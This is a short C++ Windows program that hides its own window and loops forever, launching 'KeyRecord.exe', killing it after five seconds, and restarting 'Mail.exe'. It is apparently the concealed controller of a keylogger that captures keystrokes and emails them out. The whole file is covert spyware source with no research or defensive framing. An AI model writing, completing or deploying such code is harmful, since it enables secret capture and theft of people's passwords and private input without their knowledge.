#include <windows.h>
using namespace std;
int main(){
	HWND hwnd=GetForegroundWindow();
	ShowWindow(hwnd,SW_HIDE);
	while(1){
		system("start KeyRecord.exe");
		Sleep(5000);
		system("taskkill -f -im keyrecord.exe");
		system("taskkill -f -im mail.exe");
		Sleep(100); 
		system("start Mail.exe"); 
		Sleep(100);
	}
} 
